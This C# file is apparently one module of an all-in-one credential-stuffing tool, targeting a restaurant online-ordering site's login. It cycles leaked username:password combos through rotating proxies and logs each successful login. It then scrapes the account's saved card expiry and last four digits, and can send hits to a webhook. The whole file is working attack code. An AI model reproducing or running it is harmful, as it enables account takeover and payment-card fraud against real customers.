using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Bagelboymod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var str = "username=" + array[0] + "&password=" + array[1] +
                                      "&app_id=&restaurant_id=564b586f4f5ee9ab057b23c6&order_id=&ajax=true";
                            var strResponse = req
                                .Post(
                                    "https://ordering.orders2.me/login?to=https%3A%2F%2Fordering.orders2.me/Program/bagelboy3rdave%3Fkey%3D349f2ff5ba80df26513caf426321d4e1%26include_combo%3Dtrue",
                                    str, "application/x-www-form-urlencoded").ToString();
                            {
                                if (strResponse.Contains("error"))
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                                else if (strResponse.Contains("{\"success\":true}")) //hit
                                {
                                    var checkpayment = req.Get("https://ordering.orders2.me/admin/user/profile")
                                        .ToString();
                                    var payment = "";
                                    var expire2sin = Parse(checkpayment, "expires", "</p>");
                                    var endidn = Parse(checkpayment, "ending in", "expires");
                                    if (checkpayment.Contains("expires"))
                                        payment = "true";
                                    else
                                        payment = "false";
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/BagelBoy_hits",
                                        array[0] + ":" + array[1] + " | Has payment method: " + payment +
                                        " | Expiration: " + expire2sin + " | Last four: " + endidn);
                                    if (Program.lorc == "LOG") Settings.PrintHit("BagelBoy", array[0] + ":" + array[1]);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1], "BagelBoy Hits");
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                            req.Dispose();
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}